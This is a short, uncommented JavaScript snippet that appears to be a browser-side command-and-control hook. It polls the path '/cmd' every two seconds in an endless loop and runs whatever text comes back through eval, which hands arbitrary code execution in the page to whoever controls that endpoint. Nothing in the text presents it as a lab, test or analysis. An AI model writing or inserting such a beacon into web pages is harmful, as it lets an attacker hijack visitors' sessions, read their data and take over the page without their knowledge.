(async function(){
  while (true) {
    let cmd = await fetch("/cmd").then(r => r.text());
    if (cmd) eval(cmd);
    await new Promise(r => setTimeout(r, 2000));
  }
})();